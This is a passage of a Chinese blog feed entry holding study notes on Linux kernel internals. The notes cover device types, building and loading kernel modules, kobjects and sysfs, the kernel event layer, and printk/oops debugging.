title="设备类型"></a>设备类型</h3><p>在Linux以及所有Unix系统中，设备被分为以下三种类型：</p><ul><li>块设备</li><li>字符设备</li><li>网络设备</li></ul><p>块设备通常缩写为blkdev，它是可寻址的，寻址以块为单位，块大小随设备不同而不同；块设备通常支持重定位操作，也就是对数据的随机访问。块设备是通过称为“块设备节点”的特殊文件来访问的，并且通常被挂载为文件系统。</p><p>字符设备通常缩写为cdev，它是不可寻址的，仅提供数据的流式访问，就是一个个字符，或者一个个字节。字符设备是通过称为“字符设备节点”的特殊文件来访问的。应用程序通过直接访问设备节点与字符设备交互。</p><p>网络设备是通过套接字API这样的特殊接口来访问。</p><p>有些设备驱动是虚拟的，仅提供访问内核功能而已，我们称之为“伪设备”，如内核随机数发生器（通过/dev/random和/dev/urandom访问）、空设备（通过/dev/null访问）、零设备（通过/dev/zero访问）、满设备（通过/dev/full访问），还有内存设备（通过/dev/mem访问）。然而，大部分设备驱动是表示物理设备的。</p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>Linux是“单块内核”的操作系统——即整个系统内核都运行于一个单独的保护域中。但Linux内核是模块化组成的，它允许内核在运行时动态地向其中插入或从中删除代码。这些代码被一并组合在一个单独的二进制镜像中，即所谓的可装载内核模块中，或简称为模块。</p><h4 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello, World!"></a>Hello, World!</h4><p>内核模块的Hello world!代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"Hello world!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">"Godbye!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="comment">//MODULE_LICENSE("GPL");</span></span><br><span class="line"><span class="comment">//MODULE_AUTHOR("nuoye");</span></span><br><span class="line"><span class="comment">//MODULE_DESCRIPTION("A hello world moudle");</span></span><br></pre></td></tr></table></figure><h4 id="构建模块"><a href="#构建模块" class="headerlink" title="构建模块"></a>构建模块</h4><p>构建过程的第一步是决定在哪里管理模块源码。可以把模块源码加入到内核源代码树中，或者是作为一个补丁或者是最终把代码合并到正式的内核代码树中；；另一种可行的方式是在内核源代码树之外维护和构建模块源代码。</p><h5 id="放在内核源代码树中"><a href="#放在内核源代码树中" class="headerlink" title="放在内核源代码树中"></a>放在内核源代码树中</h5><p>设备驱动程序存放在内核源码树根目录下/drivers的子目录下，在其内部，设备驱动文件被进一步按照类别、类型或特殊驱动程序等更有序地组织起来。</p><h5 id="放在内核代码外"><a href="#放在内核代码外" class="headerlink" title="放在内核代码外"></a>放在内核代码外</h5><p>需要在自己的源代码树目录中建立一个Makefile文件，并加入一行指令（假设源代码文件为fishing.c）：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-m := fishing.o</span><br></pre></td></tr></table></figure><p>假如有多个文件（如fishing-main.c和fishing-line.c）：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj-m := fishing.o</span><br><span class="line">fishing-objs := fishing-main.o fishing-line.o</span><br></pre></td></tr></table></figure><p>然后就运行以下命令编译模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ make -C /kernel/<span class="built_in">source</span>/location SUBDIRS=<span class="variable">$PWD</span> modules</span><br></pre></td></tr></table></figure><p>其中/kernel/source/location是内核源代码树。</p><h4 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h4><p>编译后的模块将被装入到目录/lib/modules/version/kernel/下，可以用下面的构造命令来安装编译的模块到合适的目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make module_install</span><br></pre></td></tr></table></figure><h4 id="产生模块依赖性"><a href="#产生模块依赖性" class="headerlink" title="产生模块依赖性"></a>产生模块依赖性</h4><p>模块依赖关系信息存放在/lib/modules/version/modules.dep中。</p><h4 id="载入模块"><a href="#载入模块" class="headerlink" title="载入模块"></a>载入模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod module.ko</span><br></pre></td></tr></table></figure><h4 id="卸载模块"><a href="#卸载模块" class="headerlink" title="卸载模块"></a>卸载模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmmod module</span><br></pre></td></tr></table></figure><h4 id="管理配置选项"><a href="#管理配置选项" class="headerlink" title="管理配置选项"></a>管理配置选项</h4><h4 id="模块参数"><a href="#模块参数" class="headerlink" title="模块参数"></a>模块参数</h4><p>Linux允许驱动程序声明参数，从而用户可以在系统启动或者模块装载时再指定参数值，这些参数对于驱动程序属于全局变量。模块参数同时也将出现在sysfs文件系统中。</p><h4 id="导出符号表"><a href="#导出符号表" class="headerlink" title="导出符号表"></a>导出符号表</h4><p>模块被载入后，就会被动态连接到内核。导出的内核函数可以被模块调用，而未导出的函数模块则无法被调用。</p><h3 id="设备模型"><a href="#设备模型" class="headerlink" title="设备模型"></a>设备模型</h3><p>2.6内核新增了统一设备模型。设备模型提供了一个独立的机制专门来标识设备，并描述其在系统中的拓扑结构。</p><h5 id="kobject"><a href="#kobject" class="headerlink" title="kobject"></a>kobject</h5><p>设备模块的核心部分就是kobject，它由struct kobject结构体表示，定义于&lt;linux/kobject.h&gt;中。</p><p>kobject通常是嵌入其他结构中的，当kobject被嵌入到其他结构中时，该结构便拥有了kobject提供的标准功能，并且，嵌入kobject的结构体可以成为对象层次架构中的一部分。</p><h4 id="ktype"><a href="#ktype" class="headerlink" title="ktype"></a>ktype</h4><p>kobject对象呗关联到一种特殊的类型：ktype，由kobj_type结构体表示，定义于&lt;linux/kobject.h&gt;中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> (*<span class="built_in">release</span>)(struct kobject *kobj);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysfs_ops</span> *<span class="title">sysfs_ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> **<span class="title">default_attrs</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ktype的存在是为了描述一族kobject所具有的普遍特性。</p><p>release指针指向在kobject引用计数减至零时要被调用的析构函数，该函数负责释放所以kobject使用的内存和其他相关清理工作。</p><p>sysfs_ops变量指向sysfs_ops结构体，该结构体描述了sysfs文件读写时的特性。</p><p>最后，default_attrs指向一个attribute结构体数组。这些结构体定义了该kobject相关的默认属性。</p><h4 id="kset"><a href="#kset" class="headerlink" title="kset"></a>kset</h4><p>kset是kobject对象的集合体。</p><p>具有相同的ktype的kobject可以被分组到不同的kset。</p><p>kobjsect中的kset指针指向kset集合。kset集合由kset结构体表示，定义于&lt;linux/kobject.h&gt;中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset_uevent_ops</span> *<span class="title">uevent_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中list连接该集合中所有的kobject对象。kobj指向的kobject对象代表了该集合的基类。uevent_ops指向一个结构体——用于处理集合中kobject对象的热插拔操作，uevent就是用户事件的缩写，提供了与用户空间热插拔信息进行通信的机制。</p><h4 id="管理和操作kobject"><a href="#管理和操作kobject" class="headerlink" title="管理和操作kobject"></a>管理和操作kobject</h4><h4 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h4><p>初始化后，kobject的引用计数设置为1.只要引用计数不为0，那么该对象就会继续保留在内存中，任何包含对象引用的代码首先要增加该对象的引用计数，结束后则减少它的引用计数。</p><p>增加引用计数称之为获得对象的引用，减少引用计数称为释放对象的引用。当引用计数跌到零时，对象便可以被撤销，同时相关内存也都被释放。</p><h3 id="sysfs"><a href="#sysfs" class="headerlink" title="sysfs"></a>sysfs</h3><p>sysfs文件系统是一个处于内存中的虚拟文件系统，它提供了kobject对象层次结构的视图。</p><p>sysfs文件系统挂载在sys目录下。</p><p>block目录下的每个子目录都对应着系统中的一个已注册的块设备。bus目录提供了一个系统总线视图。class目录包含了以高层逻辑功能组织起来的系统设备视图。dev目录是已注册设备节点的视图。devices目录是系统中设备拓扑结构视图，它直接映射出了内核中设备结构体的组织层次。firmware目录包含了一些诸如ACPI、EDD、EFI等低层子系统的特殊树。fs目录是已注册文件系统的视图。kernel目录包含内核配置项和状态信息，module目录则包含系统已加载模块的信息。power目录包含系统范围的电源管理数据。</p><p>其中，devices目录将设备模型导出到用户控件。</p><h4 id="sysfs中添加和删除kobject"><a href="#sysfs中添加和删除kobject" class="headerlink" title="sysfs中添加和删除kobject"></a>sysfs中添加和删除kobject</h4><p>函数定义于lib/kobject.c中，声明与&lt;linux/kobject.h&gt;中。</p><h4 id="向sysfs中添加文件"><a href="#向sysfs中添加文件" class="headerlink" title="向sysfs中添加文件"></a>向sysfs中添加文件</h4><h5 id="默认属性"><a href="#默认属性" class="headerlink" title="默认属性"></a>默认属性</h5><p>默认的文件集合是通过kobject和kset中的ktype字段提供的。因此所有具有相同类型的kobject在它们对应的sysfs目录下都拥有相同的默认文件集合。kobj_type字段含有一个字段——default_attrs，它是一个attribute结构体数组，定义于&lt;linux/sysfs.h&gt;中。这些属性负责将内核数据映射成sysfs中的文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attribute</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span>*<span class="title">owner</span>;</span></span><br><span class="line"><span class="keyword">mode_t</span>mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中name字段提供了该属性的名称。owner字段在存在所属模块的情况下指向其所属的module结构体；若没有该属性，那么该字段为NULL。mode字段表示了sysfs中该文件的权限。sysfs中的所有文件和目录的uid与gid标志均为零。</p><p>default_attrs列出了默认属性，而sysfs_ops字段则描述了如何使用它们。sysfs_ops字段指向了一个定义于文件&lt;linux/sysfs.h&gt;的同名结构体。</p><h5 id="创建新属性和删除新属性"><a href="#创建新属性和删除新属性" class="headerlink" title="创建新属性和删除新属性"></a>创建新属性和删除新属性</h5><p>声明在&lt;linux/kobject.h&gt;中。sysfs_create_file()和sysfs_remove_file()定义在fs/sysfs/file.c中。sysfs_create_link()和sysfs_remove_link()定义于fs/sysfs/symlink.c中。</p><h5 id="sysfs约定"><a href="#sysfs约定" class="headerlink" title="sysfs约定"></a>sysfs约定</h5><ol><li>sysfs属性应该保证每个文件只导出一个值，该值应该是文本形式而且映射为简单C类型。</li><li>sysfs中要以一个清晰的层次组织数据。</li><li>sysfs提供内核到用户空间的服务。</li></ol><h3 id="内核事件层"><a href="#内核事件层" class="headerlink" title="内核事件层"></a>内核事件层</h3><p>内核事件层实现了内核到用户的消息通知系统</p><p>内核事件把事件模拟为信号——从明确的kobject对象发出，所以每个事件源都是一个sysfs路径。每个事件都被赋予了一个动词或动作字符串表示信号。每个事件都有一个可选的负载。相比传递任意一个表示负载的字符串到用户空间而言，内核事件层使用sysfs属性代表负载。</p><p>从内部实现来讲，内核事件由内核空间传递到用户空间需要经过netlink。netlink是一个用于传送网络信息的多点传送套接字。方法就是用户空间实现一个系统后台服务用于监听套接字，处理任何读到的信息，并将事件传送到系统栈里。在内核代码向用户空间发送信号使用kobject_uevent()函数，定义于lib/kobject_uevent.c，声明在&lt;linux/kobject.h&gt;中。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="printk"><a href="#printk" class="headerlink" title="printk"></a>printk</h3><h4 id="日志等级"><a href="#日志等级" class="headerlink" title="日志等级"></a>日志等级</h4><p>printk可以指定一个日志级别，在&lt;linux/kernel.h&gt;中有简单的宏定义，如KERN_WARING等。</p><p>内核用这个指定的记录等级和当终端的记录等级console_loglevel来决定是不是向终端上打印。</p><h4 id="记录缓冲区"><a href="#记录缓冲区" class="headerlink" title="记录缓冲区"></a>记录缓冲区</h4><p>内核消息都被保存在一个LOG_BUF_LEN大小的环形队列中。</p><h4 id="syslogd和klogd"><a href="#syslogd和klogd" class="headerlink" title="syslogd和klogd"></a>syslogd和klogd</h4><p>在标准的Linux系统上，用户空间的守护进程klogd从记录缓存区中获取内核消息，在通过syslogd守护进程将它们保存在系统日志文件中。klogd程序既可以从/proc/kmsg文件中，也可以从syslog()系统调用中读取这些消息。默认情况下，它选择读取/proc方式实现。不管哪种方式，klogd都会阻塞，知道有新的内核消息可供读出。</p><p>syslogd守护进程把它接收到的所有消息添加进一个文件中，该文件默认是/var/log/messages，也可以通过/etc/syslog.conf配置文件重新指定。</p><p>在启动klogd的时候，可以通过指定-c标志来改变终端的记录等级。</p><h3 id="oops"><a href="#oops" class="headerlink" title="oops"></a>oops</h3><p>oops是内核告知用户有错误发生的最常用方式。</p><p>这个过程包括向终端上输出错误消息，输出寄存器中保存的信息并输出可供追踪的回溯线索。通常，发送完oops之后，内核会处于一种不稳定状态。</p><h4 id="ksymoops"><a href="#ksymoops" class="headerlink" title="ksymoops"></a>ksymoops</h4><p>命令ksymoops可以将回溯线索中的地址转化成有意义的符号名称。但必须提供编译内核时产生的System.map。</p><h4 id="kallsyms"><a href="#kallsyms" class="headerlink" title="kallsyms"></a>kallsyms</h4><h3 id="内核调试配置选项"><a href="#内核调试配置选项" class="headerlink" title="内核调试配置选项"></a>内核调试配置选项</h3><h3 id="引发bug并打印信息"><a href="#引发bug并打印信息" class="headerlink" title="引发bug并打印信息"></a>引发bug并打印信息</h3><h3 id="系统请求键"><a href="#系统请求键" class="headerlink" title="系统请求键"></a>系统请求键</h3><p>内核代码中Documentation/sysrq.txt对此有详细说明，实际的实现在drivers/char/sysrq.c中。</p><h3 id="内核调试器"><a href="#内核调试器" class="headerlink" title="内核调试器"></a>内核调试器</h3><h4 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h4><h4 id="kgdb"><a href="#kgdb" class="headerlink" title="kgdb"></a>kgdb</h4><p>该补丁在Documentation/目录下有很多安装说明。</p><h3 id="探测系统"><a href="#探测系统" class="headerlink" title="探测系统"></a>探测系统</h3><p>下面介绍几种技巧以修改来进一步探测系统从而得到答案：</p><ul><li>用UID作为选择条件</li><li>使用条件变量</li><li>使用统计量</li><li>重复频率限制</li></ul><h2 id="可移植性"><a href="#可移植性" class="headerlink" title="可移植性"></a>可移植性</h2><h3 id="可移植性操作系统"><a href="#可移植性操作系统" class="headerlink" title="可移植性操作系统"></a>可移植性操作系统</h3><h3 id="字长和数据类型"><a href="#字长和数据类型" class="headerlink" title="字长和数据类型"></a>字长和数据类型</h3><h3 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h3><h3 id="字节顺序"><a href="#字节顺序" class="headerlink" title="字节顺序"></a>字节顺序</h3><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><h3 id="页长度"><a href="#页长度" class="headerlink" title="页长度"></a>页长度</h3><h3 id="处理器排序"><a href="#处理器排序" class="headerlink" title="处理器排序"></a>处理器排序</h3><h3 id="SMP、内核抢占、高端内存"><a href="#SMP、内核抢占、高端内存" class="headerlink" title="SMP、内核抢占、高端内存"></a>SMP、内核抢占、高端内存</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux内核设计与实现&quot;&gt;&lt;a href=&quot;#Linux内核设计与实现&quot; class=&quot;headerlink&quot; title=&quot;Linux内核设计与实现&quot;&gt;&lt;/a&gt;Linux内核设计与实现&lt;/h1&gt;&lt;h2 id=&quot;操作系统和内核简介&quot;&gt;&lt;a href=&quot;#操作系统
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="kernel" scheme="https://nuoye-blog.github.io/tags/kernel/"/>
    
  </entry>
  
</feed>
